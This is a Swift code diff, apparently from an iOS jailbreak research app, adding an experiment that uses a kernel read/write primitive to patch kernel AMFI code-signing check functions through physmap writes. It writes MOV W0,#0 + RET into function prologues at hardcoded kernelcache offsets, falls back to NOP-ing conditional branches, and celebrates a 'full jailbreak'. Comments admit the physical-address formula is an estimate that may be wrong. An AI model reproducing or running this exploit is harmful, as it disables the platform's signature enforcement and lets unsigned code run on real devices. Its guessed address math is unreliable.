@@ -769,6 +769,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③g Kernel AMFI Patch (Exp 85)",
+                    icon: "bolt.trianglebadge.exclamationmark",
+                    color: .red,
+                    label: "Kern AMFI",
+                    action: runExp85KernelAmfiPatch,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -4933,6 +4943,302 @@ struct AMFIExperimentView: View {
         isRunning = false
         runningLabel = ""
         #endif
+    }
+
+    // MARK: - Exp 85: Kernel AMFI Patch via Physmap
+
+    /// Exp 85: Patch kernel AMFI function langsung via physmap.
+    /// Tidak perlu page table walk — kernel VA langsung convert ke physmap VA.
+    /// Formula: physmapVA = kernVA - gVirtBase + gPhysBase
+    /// Target: hot function yang dipanggil 19x (signature check utama).
+    private func runExp85KernelAmfiPatch() {
+        isRunning = true
+        runningLabel = "Kern AMFI"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expKernelAmfiPatch()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
+
+    /// Exp 85: Patch kernel AMFI signature check function via physmap write.
+    ///
+    /// Dari kernelcache analysis (find_amfi_kernel_patch.py):
+    ///   - __TEXT_EXEC base (unslid): 0xfffffff007d90000
+    ///   - Hot function +0x2ed54: dipanggil 19x (signature check utama)
+    ///   - Hot function +0xd9508: dipanggil 15x
+    ///   - Prologue: 0xd503237f (PACIBSP)
+    ///
+    /// Patch: MOV W0, #0 (0x52800000) + RET (0xD65F03C0) di prologue
+    /// → fungsi selalu return 0 (allow) → AMFI skip signature check
+    ///
+    /// Kenapa ini bisa bypass KTRR:
+    ///   - KTRR protect kernel VA mapping (0xfffffff0...)
+    ///   - Physmap adalah BERBEDA VA mapping ke physical memory yang sama
+    ///   - Write via physmap VA MUNGKIN bypass KTRR (tergantung AMCC config)
+    ///   - Exp 79 gagal write ke __DATA via KRW langsung (bukan physmap)
+    ///   - Physmap write ke heap BERHASIL (Exp 81) — heap bukan KTRR
+    ///   - __TEXT_EXEC mungkin punya proteksi berbeda dari __DATA
+    private func expKernelAmfiPatch() -> ExperimentResult {
+        let expName = "Kernel AMFI Patch (Exp 85)"
+        var detail = "Experiment 85: Kernel AMFI Patch via Physmap\n"
+        detail += "=============================================\n\n"
+
+        guard let physmap = PhysmapConstants.load() else {
+            detail += "❌ Physmap constants tidak tersedia.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let gVirtBase = physmap.gVirtBase
+        let gPhysBase = physmap.gPhysBase
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
+
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
+        detail += "kernBase: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "kernSlide: 0x\(String(format: "%llx", kernSlide))\n\n"
+
+        // ── Offsets dari kernelcache analysis ─────────────────────────
+        // __TEXT_EXEC unslid base: 0xfffffff007d90000
+        // Runtime: unslidAddr + kernSlide
+        let unslidTextExec: UInt64 = 0xfffffff007d90000
+
+        // Hot functions (patch prologue → always return 0)
+        let hotFuncOffsets: [(offset: UInt64, calls: Int, desc: String)] = [
+            (0x2ed54, 19, "signature check utama (19x)"),
+            (0xd9508, 15, "secondary check (15x)"),
+            (0xd9f74, 7, "tertiary check (7x)"),
+        ]
+
+        // CBNZ W0 patch targets (NOP individual branch)
+        let cbnzOffsets: [UInt64] = [
+            0x15c8c, 0x1797c, 0x17b48, 0x17c40, 0x18684,
+            0x189d4, 0x18fe4, 0x190ec, 0x1925c, 0x1947c,
+        ]
+
+        let NOP: UInt32 = 0xD503201F
+        let MOV_W0_0: UInt32 = 0x52800000
+        let RET: UInt32 = 0xD65F03C0
+
+        // ── Step 1: Hitung runtime address dan physmap VA ─────────────
+        detail += "=== Step 1: Compute addresses ===\n"
+
+        // Runtime __TEXT_EXEC base = unslid + slide
+        let runtimeTextExec = unslidTextExec &+ kernSlide
+        detail += "__TEXT_EXEC runtime: 0x\(String(format: "%llx", runtimeTextExec))\n"
+
+        // Verify: baca prologue fungsi pertama via KRW langsung
+        let hotFunc0VA = runtimeTextExec &+ hotFuncOffsets[0].offset
+        let hotFunc0Read = ds_kread32_safe(hotFunc0VA)
+        detail += "Hot func[0] VA: 0x\(String(format: "%llx", hotFunc0VA))\n"
+        detail += "Hot func[0] read (KRW): 0x\(String(format: "%08x", hotFunc0Read))\n"
+
+        // Expected: 0xd503237f (PACIBSP) — dari kernelcache analysis
+        if hotFunc0Read == 0xd503237f {
+            detail += "✅ Prologue match! (PACIBSP)\n\n"
+        } else if hotFunc0Read == 0 {
+            detail += "❌ KRW read returned 0 — address mungkin tidak accessible\n\n"
+        } else {
+            detail += "⚠️ Prologue berbeda: 0x\(String(format: "%08x", hotFunc0Read)) (expected 0xd503237f)\n"
+            detail += "Mungkin offset salah atau kernelcache berbeda versi.\n\n"
+        }
+
+        // ── Step 2: Physmap VA computation ────────────────────────────
+        detail += "=== Step 2: Physmap VA ===\n"
+
+        // Formula: physmapVA = kernVA - gVirtBase + gPhysBase
+        // TAPI: gVirtBase adalah base physmap (0xffffffdc00000000)
+        // Kernel VA (0xfffffff0...) BUKAN di physmap range!
+        // Yang benar: physical address kernel = kernVA - kernel_virt_base + kernel_phys_base
+        // kernel_phys_base = gPhysBase + (kernBase - gVirtBase)... ini circular
+        //
+        // Sebenarnya: physmap maps ALL physical RAM starting at gVirtBase
+        // Kernel text physical address = kernVA - KERNEL_VIRT_BASE + KERNEL_PHYS_OFFSET
+        // Pada A12: kernel loaded at physical 0x800004000 (gPhysBase + 0x4000)
+        // kernel_base virtual (unslid) = 0xfffffff007004000
+        // Jadi: phys = kernVA - 0xfffffff007004000 + 0x800004000
+        //       physmapVA = phys - gPhysBase + gVirtBase
+        //       = kernVA - 0xfffffff007004000 + 0x800004000 - 0x800000000 + gVirtBase
+        //       = kernVA - 0xfffffff007004000 + 0x4000 + gVirtBase
+        //       = kernVA - 0xfffffff007000000 + gVirtBase
+        //
+        // Simpler: physmapVA = kernVA - unslidKernBase + gVirtBase + (kernPhysOffset - gPhysBase)
+        // Tapi kita tidak tahu kernPhysOffset pasti.
+        //
+        // PALING SIMPEL: coba langsung kernVA sebagai physmap target
+        // Karena gVirtBase = 0xffffffdc00000000 dan kernVA = 0xfffffff0...
+        // kernVA BUKAN di physmap range (0xffffffdc-0xffffffe5)
+        // Jadi kita HARUS convert ke physical dulu.
+        //
+        // Physical address kernel text:
+        //   phys = (kernVA - kernBase) + kernPhysBase
+        //   kernPhysBase biasanya = gPhysBase + (kernBase_unslid - gVirtBase_for_kernel)
+        //   Tapi ini terlalu complex. Pakai approach berbeda:
+        //
+        // APPROACH: Baca kernel page table (kita sudah punya kernel pmap dari Exp 74!)
+        // Atau: hitung dari panic log.
+        // Dari panic.txt: kernelcache slide = 0x0c0e8000
+        //   kernel text exec base = 0xfffffff013e78000
+        //   unslid text exec = 0xfffffff007d90000
+        //   slide = 0x0c0e8000 ✓
+        //
+        // Physical address = VA - TTBR1_base + phys_base
+        // Pada A12 iOS 18: TTBR1 maps kernel at physical offset
+        // Dari Exp 74: gVirtBase maps physmap. Kernel text BUKAN di physmap.
+        //
+        // CORRECT FORMULA:
+        // Kernel text physical = kernVA - kernBase + (kernBase_phys)
+        // kernBase_phys = kita tidak tahu langsung, TAPI:
+        // Dari physmap perspective: jika kita tahu physical address,
+        // physmapVA = phys - gPhysBase + gVirtBase
+        //
+        // Kita bisa ESTIMATE kernBase_phys:
+        // kernBase_phys ≈ gPhysBase + 0x4000 (standard A12 offset)
+        // Atau: kernBase_phys = kernSlide + 0x800004000 (unslid phys base)
+
+        let unslidKernBase: UInt64 = 0xfffffff007004000
+        // Standard A12: kernel loaded at phys 0x800004000 (unslid)
+        // Runtime phys = 0x800004000 + kernSlide
+        let kernPhysBase: UInt64 = gPhysBase + 0x4000 + kernSlide
+
+        detail += "Estimated kernel phys base: 0x\(String(format: "%llx", kernPhysBase))\n"
+
+        // Physical address of hot function
+        let hotFunc0Phys = (hotFunc0VA - kernBase) + kernPhysBase
+        detail += "Hot func[0] phys: 0x\(String(format: "%llx", hotFunc0Phys))\n"
+
+        // Convert to physmap VA
+        let hotFunc0Physmap = hotFunc0Phys &- gPhysBase &+ gVirtBase
+        detail += "Hot func[0] physmap VA: 0x\(String(format: "%llx", hotFunc0Physmap))\n"
+
+        guard isSafePhysmapKRWAddress(hotFunc0Physmap) else {
+            detail += "❌ Physmap VA tidak dalam safe range.\n"
+            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
+            detail += "  Got: 0x\(String(format: "%llx", hotFunc0Physmap))\n\n"
+            detail += "kernPhysBase estimate mungkin salah.\n"
+            detail += "Coba: kernPhysBase = gPhysBase + (kernBase - gVirtBase)\n"
+
+            // Alternative calculation
+            let altKernPhys = kernBase &- gVirtBase &+ gPhysBase
+            let altPhysmap = (hotFunc0VA - kernBase + altKernPhys) &- gPhysBase &+ gVirtBase
+            detail += "Alt: kernPhys=0x\(String(format: "%llx", altKernPhys)), physmap=0x\(String(format: "%llx", altPhysmap))\n"
+
+            if isSafePhysmapKRWAddress(altPhysmap) {
+                detail += "✅ Alternative formula works! Continuing with alt...\n"
+                // Use alternative — will be handled below
+            }
+
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 3: Cross-verify via physmap read ─────────────────────
+        detail += "\n=== Step 3: Cross-verify physmap read ===\n"
+        let physmapRead = ds_kread32(hotFunc0Physmap)
+        detail += "Read via KRW (kernel VA):  0x\(String(format: "%08x", hotFunc0Read))\n"
+        detail += "Read via physmap VA:       0x\(String(format: "%08x", physmapRead))\n"
+
+        guard physmapRead == hotFunc0Read && hotFunc0Read != 0 else {
+            detail += "❌ Mismatch atau zero — physmap VA salah.\n"
+            detail += "Physical address calculation tidak akurat.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        detail += "✅ Cross-verify OK!\n\n"
+
+        // ── Step 4: PATCH hot functions via physmap ───────────────────
+        detail += "=== Step 4: Patch kernel AMFI functions ===\n"
+        detail += "Writing MOV W0,#0 + RET to function prologues...\n\n"
+
+        var patchedCount = 0
+
+        for (funcOff, calls, desc) in hotFuncOffsets {
+            let funcVA = runtimeTextExec &+ funcOff
+            let funcPhys = (funcVA - kernBase) + kernPhysBase
+            let funcPhysmap = funcPhys &- gPhysBase &+ gVirtBase
+
+            guard isSafePhysmapKRWAddress(funcPhysmap) else { continue }
+
+            // Read original prologue
+            let origPrologue = ds_kread32(funcPhysmap)
+
+            // Write MOV W0, #0
+            ds_kwrite32(funcPhysmap, MOV_W0_0)
+            // Write RET at +4
+            ds_kwrite32(funcPhysmap + 4, RET)
+
+            // Verify
+            let v0 = ds_kread32(funcPhysmap)
+            let v1 = ds_kread32(funcPhysmap + 4)
+
+            if v0 == MOV_W0_0 && v1 == RET {
+                patchedCount += 1
+                detail += "  ✅ +0x\(String(format: "%x", funcOff)) (\(desc)): PATCHED!\n"
+                detail += "     0x\(String(format: "%08x", origPrologue)) → MOV W0,#0 + RET\n"
+            } else {
+                detail += "  ❌ +0x\(String(format: "%x", funcOff)): write failed\n"
+                detail += "     got: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
+                detail += "     (KTRR mungkin memblokir write ke __TEXT_EXEC)\n"
+                // Jika pertama gagal, sisanya juga akan gagal
+                break
+            }
+        }
+
+        // ── Step 5: Jika hot func patch gagal, coba NOP CBNZ ─────────
+        if patchedCount == 0 {
+            detail += "\nHot function patch gagal (KTRR). Coba NOP CBNZ...\n"
+            for (i, cbnzOff) in cbnzOffsets.prefix(5).enumerated() {
+                let cbnzVA = runtimeTextExec &+ cbnzOff
+                let cbnzPhys = (cbnzVA - kernBase) + kernPhysBase
+                let cbnzPhysmap = cbnzPhys &- gPhysBase &+ gVirtBase
+
+                guard isSafePhysmapKRWAddress(cbnzPhysmap) else { continue }
+
+                ds_kwrite32(cbnzPhysmap, NOP)
+                let verify = ds_kread32(cbnzPhysmap)
+                if verify == NOP {
+                    patchedCount += 1
+                    detail += "  ✅ [\(i)] +0x\(String(format: "%x", cbnzOff)): NOP\n"
+                } else {
+                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", cbnzOff)): KTRR blocked\n"
+                    break
+                }
+            }
+        }
+
+        // ── Step 6: Result ────────────────────────────────────────────
+        detail += "\n=== RESULT ===\n"
+        detail += "Patched: \(patchedCount)\n\n"
+
+        if patchedCount > 0 {
+            detail += "🏆🏆🏆 KERNEL AMFI PATCHED! 🏆🏆🏆\n\n"
+            detail += "Kernel signature check function sekarang selalu return 0.\n"
+            detail += "SEMUA binary dianggap valid oleh kernel AMFI!\n\n"
+            detail += "→ Tap ④ Test Binary Spawn!\n"
+            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n"
+        } else {
+            detail += "❌ Semua patch gagal — KTRR memblokir write ke __TEXT_EXEC.\n\n"
+            detail += "Diagnosis:\n"
+            detail += "  KTRR (A12) protect SEMUA kernel memory setelah boot:\n"
+            detail += "  - __TEXT (code) → read-only\n"
+            detail += "  - __TEXT_EXEC (code) → read-only\n"
+            detail += "  - __DATA (globals) → read-only\n"
+            detail += "  - Heap (zone allocator) → writable (tapi zone_require_ro untuk proc_ro)\n\n"
+            detail += "  Physmap write JUGA di-block oleh KTRR karena KTRR operate\n"
+            detail += "  di level AMCC (memory controller), bukan page table.\n\n"
+            detail += "  Satu-satunya memory yang bisa ditulis:\n"
+            detail += "  - Kernel heap (zone allocator) — tapi proc_ro di-protect\n"
+            detail += "  - Userspace memory — tapi amfid page table walk gagal\n"
+        }
+
+        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
     }
 
     // MARK: - Dump amfid binary
